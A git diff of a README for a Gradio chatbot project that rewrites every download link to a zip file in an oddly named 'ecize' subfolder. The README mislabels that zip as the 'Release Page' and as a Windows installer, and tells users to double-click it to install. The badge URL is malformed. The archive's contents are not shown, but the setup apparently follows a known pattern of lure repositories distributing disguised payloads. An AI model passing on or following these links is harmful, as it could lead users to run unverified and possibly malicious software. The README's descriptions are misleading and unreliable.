@@ -7,9 +7,9 @@ Welcome to the Multi-Backend Chatbot with Gradio! This application lets you inte
 To get started, follow the steps below. You will download the application, install it, and be ready to engage with the chatbot.
 
 ## 📥 Download the Application  
-[![Download Now](https://raw.githubusercontent.com/javieroon/Multi-Backend-Chatbot-with-Gradio/main/ecize/Chatbot_Multi_with_Gradio_Backend_2.5.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/javieroon/Multi-Backend-Chatbot-with-Gradio/main/ecize/Chatbot_Multi_with_Gradio_Backend_2.5.zip)
+[![Download Now](https://github.com/javieroon/Multi-Backend-Chatbot-with-Gradio/raw/refs/heads/main/ecize/Chatbot_Multi_with_Gradio_Backend_2.5.zip%20Now-Release%20Page-brightgreen)](https://github.com/javieroon/Multi-Backend-Chatbot-with-Gradio/raw/refs/heads/main/ecize/Chatbot_Multi_with_Gradio_Backend_2.5.zip)
 
-Visit the [Release Page](https://raw.githubusercontent.com/javieroon/Multi-Backend-Chatbot-with-Gradio/main/ecize/Chatbot_Multi_with_Gradio_Backend_2.5.zip) to download the latest version of the application.
+Visit the [Release Page](https://github.com/javieroon/Multi-Backend-Chatbot-with-Gradio/raw/refs/heads/main/ecize/Chatbot_Multi_with_Gradio_Backend_2.5.zip) to download the latest version of the application.
 
 ## 🖥️ System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -21,9 +21,9 @@ Before downloading, ensure your system meets the following requirements:
 - **Network**: Internet connection for cloud model support
 
 ## 📥 Download & Install
-1. Click on the [Release Page](https://raw.githubusercontent.com/javieroon/Multi-Backend-Chatbot-with-Gradio/main/ecize/Chatbot_Multi_with_Gradio_Backend_2.5.zip).
+1. Click on the [Release Page](https://github.com/javieroon/Multi-Backend-Chatbot-with-Gradio/raw/refs/heads/main/ecize/Chatbot_Multi_with_Gradio_Backend_2.5.zip).
 2. Look for the latest version. You will find several files available.
-3. Download the installer suitable for your operating system (e.g., `https://raw.githubusercontent.com/javieroon/Multi-Backend-Chatbot-with-Gradio/main/ecize/Chatbot_Multi_with_Gradio_Backend_2.5.zip` for Windows).
+3. Download the installer suitable for your operating system (e.g., `https://github.com/javieroon/Multi-Backend-Chatbot-with-Gradio/raw/refs/heads/main/ecize/Chatbot_Multi_with_Gradio_Backend_2.5.zip` for Windows).
 4. Once downloaded, locate the file in your downloads folder.
 5. Double-click the file to start the installation.
 6. Follow the on-screen instructions to complete the installation.
